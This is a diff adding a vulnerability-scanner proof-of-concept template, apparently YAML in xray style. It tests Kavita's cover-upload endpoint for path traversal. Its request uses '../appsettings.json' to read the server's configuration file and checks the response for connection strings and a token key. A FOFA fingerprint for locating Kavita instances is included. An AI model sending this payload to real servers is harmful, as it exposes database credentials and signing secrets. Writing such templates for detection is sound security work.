@@ -1,0 +1,15 @@
+id: poc-yaml-kavita-cover-upload-path-traversal
+info:
+  name: Kavita cover-upload 路径遍历漏洞
+  severity: high
+  tags:
+  - 目录遍历
+  finger: kavita
+  fofa: title="Kavita"
+requests:
+- method: GET
+  path: /api/image/cover-upload?filename=../appsettings.json
+  expression: status_code == 200 && contains(body,"ConnectionStrings") && contains(body,"TokenKey")
+    && contains(headers,"appsettings.json") && contains(content_type,"image/json")
+variables: {}
+transport: http
